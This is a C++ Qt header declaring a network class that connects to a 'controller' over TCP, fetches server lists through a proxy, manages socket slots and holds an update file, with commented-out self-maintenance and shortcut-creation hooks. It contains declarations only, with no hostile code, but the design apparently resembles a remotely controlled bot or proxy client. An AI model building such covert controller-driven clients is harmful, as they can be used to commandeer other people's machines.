#ifndef COM_H
#define COM_H

#include <QObject>
#include <QNetworkAccessManager>
#include <QtNetwork>
#include "enc.h"

//#include <ShObjIdl.h>
//#define IID_IShellLink IID_IShellLinkW

class com : public QObject
{
    Q_OBJECT

public:
    com();
    ~com();
    void connectToControllerTCP(QString addr, quint16 port);

protected:
    QNetworkAccessManager *connectToProxyDownload;
    QTcpSocket *sckController;
    bool isConnected;
    QByteArray barControllerQueue;
    QVector<QTcpSocket*> lstSlots;
    QTimer *timer;
    quint32 lastHttp;
    QList<QByteArray> lstServers;
    QTemporaryFile *fileUpdate;

//    void makeShortcut(QString target, QString linkpath);

protected slots:
    bool connectToProxy();
    void connectToProxyDone(QNetworkReply* reply);
    void sckController_connected();
    void sckController_readyRead();
    void sckController_disconnected();
    void sckSlot_connected();
    void sckSlot_error(QAbstractSocket::SocketError err);
    void sckSlot_disconnected();
    void sckSlot_readyRead();
//    void selfmaintain_step1();
//    void selfmaintain_step2();
//    void selfmaintain_step3();
};

#endif // COM_H
